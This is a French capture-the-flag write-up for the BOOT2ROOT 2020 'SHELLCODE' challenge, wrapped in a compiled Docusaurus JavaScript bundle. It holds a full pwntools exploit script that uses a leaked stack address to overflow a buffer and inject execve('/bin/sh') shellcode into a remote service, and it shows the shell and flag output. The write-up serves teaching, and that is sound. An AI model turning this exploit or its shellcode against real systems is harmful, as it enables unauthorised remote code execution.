"use strict";(self.webpackChunkwriteups_docs=self.webpackChunkwriteups_docs||[]).push([[7021],{3905:(e,n,t)=>{t.d(n,{Zo:()=>p,kt:()=>m});var r=t(7294);function a(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function l(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){a(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function s(e,n){if(null==e)return{};var t,r,a=function(e,n){if(null==e)return{};var t,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||(a[t]=e[t]);return a}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var c=r.createContext({}),i=function(e){var n=r.useContext(c),t=n;return e&&(t="function"==typeof e?e(n):l(l({},n),e)),t},p=function(e){var n=i(e.components);return r.createElement(c.Provider,{value:n},e.children)},d="mdxType",u={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},f=r.forwardRef((function(e,n){var t=e.components,a=e.mdxType,o=e.originalType,c=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),d=i(t),f=a,m=d["".concat(c,".").concat(f)]||d[f]||u[f]||o;return t?r.createElement(m,l(l({ref:n},p),{},{components:t})):r.createElement(m,l({ref:n},p))}));function m(e,n){var t=arguments,a=n&&n.mdxType;if("string"==typeof e||a){var o=t.length,l=new Array(o);l[0]=f;var s={};for(var c in n)hasOwnProperty.call(n,c)&&(s[c]=n[c]);s.originalType=e,s[d]="string"==typeof e?e:a,l[1]=s;for(var i=2;i<o;i++)l[i]=t[i];return r.createElement.apply(null,l)}return r.createElement.apply(null,t)}f.displayName="MDXCreateElement"},6180:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>l,default:()=>d,frontMatter:()=>o,metadata:()=>s,toc:()=>i});var r=t(7462),a=(t(7294),t(3905));const o={},l="SHELLCODE",s={unversionedId:"2020/BOOT2ROOT/challenges/shellcode",id:"2020/BOOT2ROOT/challenges/shellcode",title:"SHELLCODE",description:"- Fichier : shellcode",source:"@site/docs/2020/BOOT2ROOT/challenges/shellcode.md",sourceDirName:"2020/BOOT2ROOT/challenges",slug:"/2020/BOOT2ROOT/challenges/shellcode",permalink:"/writeups-docs/docs/2020/BOOT2ROOT/challenges/shellcode",draft:!1,editUrl:"https://github.com/pynard/writeups-docs/tree/main/docs/2020/BOOT2ROOT/challenges/shellcode.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"ROPPY_ROPPER",permalink:"/writeups-docs/docs/2020/BOOT2ROOT/challenges/roppy_ropper"},next:{title:"STRING",permalink:"/writeups-docs/docs/2020/BOOT2ROOT/challenges/string"}},c={},i=[],p={toc:i};function d(e){let{components:n,...o}=e;return(0,a.kt)("wrapper",(0,r.Z)({},p,o,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"shellcode"},"SHELLCODE"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"ncat 35.238.225.156 1006\n")),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Fichier : ",(0,a.kt)("a",{parentName:"li",href:"../attachements/shellcode/shellcode"},"shellcode"),"\nIci il faut faire une injection de shell, le stack est ex\xe9cutable")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js"},"$ checksec shellcode\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      PIE enabled\n    RWX:      Has RWX segments\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-py"},"gdb> vmmap\n0x00007ffffffde000 0x00007ffffffff000 rwxp    [stack]\n")),(0,a.kt)("p",null,"Et le programme est gentil il nous file m\xeame l'adresse du stack :)"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ncat 35.238.225.156 1006\nAmigo's I welcome you to the boot2root server\nWait did I say something I wasnt supposed to[0x7fffffffe250] ?\nOkay Waiting for the answer now\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-as"},'lea rdi, str.Wait_did_I_say_something_I_wasnt_supposed_to__p ; 0x2038 ; "Wait did I say something I wasnt supposed to[%p] ?\\n"\nmov eax, 0\ncall sym.imp.printf\n')),(0,a.kt)("p",null,"Alors on fait un programme qui se connecte au serveur, r\xe9cup\xe8re l'adresse du stack, puis send une payload de ce type :"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"overflow + ret + shell\n")),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"exploit.py")," :"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-py"},"import re\nimport struct\nfrom pwn import *\n\nconn = remote('35.238.225.156', 1006)\n\nreceived = conn.recvuntil('now\\n')\nprint(received.decode())\n\nreg = re.search('.*\\[(.*)\\].*',received.decode())\nassert reg, log.error('Stack address not found !')\n\nstack_addr = reg.group(1).encode()\nstack_addr = int(stack_addr,16)\nlog.info('Stack addresss is at {}'.format(hex(stack_addr)))\n\n\noverflow = b'A'*24\nret = struct.pack('Q',stack_addr+len(overflow)+8)\nshell = b'\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05'\n\npayload = overflow + ret + shell\n\nlog.info('Sending payload...')\nconn.send(payload + b'\\n')\n\nlog.success('Executing /bin/sh : ')\nconn.interactive()\n")),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Fichier : ",(0,a.kt)("a",{target:"_blank",href:t(4046).Z},"exploit.py"),"\nOn l'ex\xe9cute et on a un shell :)")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ python exploit.py\n[+] Opening connection to 127.0.0.1 on port 13371: Done\nAmigo's I welcome you to the boot2root server\nWait did I say something I wasnt supposed to[0x7fffffffe1d0] ?\nOkay Waiting for the answer now\n\n[*] Stack addresss is at 0x7fffffffe1d0\n[*] Sending payload...\n[+] Executing /bin/sh :\n[*] Switching to interactive mode\n$ cat flag\nb00t2root{sehllz_c0de}\n")),(0,a.kt)("p",null,"flag : ",(0,a.kt)("inlineCode",{parentName:"p"},"b00t2root{sehllz_c0de}")))}d.isMDXComponent=!0},4046:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/files/exploit-234e65940d0a264871923a5d86af7b1e.py"}}]);